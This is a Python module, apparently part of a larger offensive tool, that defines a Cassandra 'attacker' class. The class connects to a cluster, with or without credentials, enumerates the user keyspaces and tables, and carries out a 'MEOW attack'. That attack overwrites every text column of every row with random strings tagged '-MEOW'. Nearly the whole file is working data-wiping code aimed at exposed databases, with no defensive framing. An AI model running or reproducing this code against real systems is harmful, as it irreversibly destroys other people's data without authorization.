import random
import string
from cassandra.cluster import Cluster
from cassandra.auth import PlainTextAuthProvider
from core.base_attacker import BaseAttacker

class CassandraAttacker(BaseAttacker):
    """
    Cassandra implementation of the BaseAttacker.
    """

    @classmethod
    def get_service_name(cls):
        return "cassandra"

    @classmethod
    def get_default_port(cls):
        return 9042

    def connect(self):
        """
        Connect to Cassandra cluster.
        """
        try:
            # Build connection parameters
            contact_points = [self.host]

            # Add authentication if provided
            if self.username and self.password:
                auth_provider = PlainTextAuthProvider(
                    username=self.username,
                    password=self.password
                )
                self.cluster = Cluster(
                    contact_points=contact_points,
                    port=self.port,
                    auth_provider=auth_provider
                )
            else:
                self.cluster = Cluster(
                    contact_points=contact_points,
                    port=self.port
                )

            # Connect to cluster
            self.session = self.cluster.connect()

            # Verify connection by querying system keyspace
            self.session.execute("SELECT * FROM system_schema.keyspaces LIMIT 1")

            self.logger.info("Successfully connected to Cassandra")
            return self.session
        except Exception as e:
            self.logger.error(f"Failed to connect to Cassandra: {str(e)}")
            raise

    def get_databases(self):
        """
        In Cassandra, keyspaces are the equivalent of databases.
        Get list of keyspaces, excluding system keyspaces.
        """
        query = "SELECT keyspace_name FROM system_schema.keyspaces"
        rows = self.session.execute(query)

        # Filter out system keyspaces
        system_keyspaces = ['system', 'system_auth', 'system_distributed',
                           'system_schema', 'system_traces', 'system_virtual_schema']

        keyspaces = [row.keyspace_name for row in rows
                    if row.keyspace_name not in system_keyspaces]

        return keyspaces

    def get_collections(self, keyspace):
        """
        In Cassandra, tables are the equivalent of collections.
        Get list of tables for the specified keyspace.
        """
        query = f"SELECT table_name FROM system_schema.tables WHERE keyspace_name = '{keyspace}'"
        rows = self.session.execute(query)

        return [row.table_name for row in rows]

    def random_alphanumeric(self, length=10):
        """
        Generate a random alphanumeric string.
        """
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def meow_data(self, keyspace, table):
        """
        Execute the MEOW attack on the specified table.
        """
        # Set the keyspace
        self.session.set_keyspace(keyspace)

        # Get the table schema to understand columns
        schema_query = f"""
            SELECT column_name, type
            FROM system_schema.columns
            WHERE keyspace_name = '{keyspace}' AND table_name = '{table}'
            ALLOW FILTERING
        """
        schema_rows = self.session.execute(schema_query)

        # Identify primary key columns and regular columns
        pk_query = f"""
            SELECT column_name
            FROM system_schema.columns
            WHERE keyspace_name = '{keyspace}'
            AND table_name = '{table}'
            AND kind = 'partition_key'
            ALLOW FILTERING
        """
        pk_rows = self.session.execute(pk_query)
        primary_keys = {row.column_name for row in pk_rows}

        # Get clustering key columns
        ck_query = f"""
            SELECT column_name
            FROM system_schema.columns
            WHERE keyspace_name = '{keyspace}'
            AND table_name = '{table}'
            AND kind = 'clustering'
            ALLOW FILTERING
        """
        ck_rows = self.session.execute(ck_query)
        clustering_keys = {row.column_name for row in ck_rows}

        # Combine all key columns
        key_columns = primary_keys.union(clustering_keys)

        # Get all columns
        columns = {}
        for row in schema_rows:
            columns[row.column_name] = row.type

        # Fetch all rows (ALLOW FILTERING needed for queries without WHERE on partition key)
        select_query = f"SELECT * FROM {table} ALLOW FILTERING"
        data_rows = self.session.execute(select_query)

        modified_count = 0

        for row in data_rows:
            # Build update statement
            update_fields = []
            where_conditions = []

            for col_name, col_type in columns.items():
                col_value = getattr(row, col_name, None)

                if col_name in key_columns:
                    # Use key columns in WHERE clause
                    if isinstance(col_value, str):
                        where_conditions.append(f"{col_name} = '{col_value}'")
                    else:
                        where_conditions.append(f"{col_name} = {col_value}")
                else:
                    # Update non-key columns
                    if col_type in ('text', 'varchar', 'ascii'):
                        random_chars = self.random_alphanumeric()
                        new_value = f"{random_chars}-MEOW"
                        update_fields.append(f"{col_name} = '{new_value}'")
                    elif col_type in ('int', 'bigint', 'smallint', 'tinyint', 'varint'):
                        # For numeric types, we'll still use a text representation
                        random_chars = self.random_alphanumeric()
                        # Note: This will fail for numeric columns, so we skip them
                        # Instead, we could set them to a random number
                        continue
                    elif col_type in ('float', 'double', 'decimal'):
                        # Skip numeric types
                        continue
                    else:
                        # For other types, attempt to set as string (may fail)
                        random_chars = self.random_alphanumeric()
                        new_value = f"{random_chars}-MEOW"
                        update_fields.append(f"{col_name} = '{new_value}'")

            if update_fields and where_conditions:
                update_query = f"""
                    UPDATE {table}
                    SET {', '.join(update_fields)}
                    WHERE {' AND '.join(where_conditions)}
                """
                try:
                    self.session.execute(update_query)
                    modified_count += 1
                except Exception as e:
                    self.logger.warning(f"Failed to update row: {str(e)}")

        self.logger.info(f"Modified {modified_count} rows in {keyspace}.{table}")
        return modified_count

    def close(self):
        """
        Close the Cassandra connection.
        """
        if hasattr(self, 'cluster'):
            self.cluster.shutdown()
            self.logger.info("Cassandra connection closed")
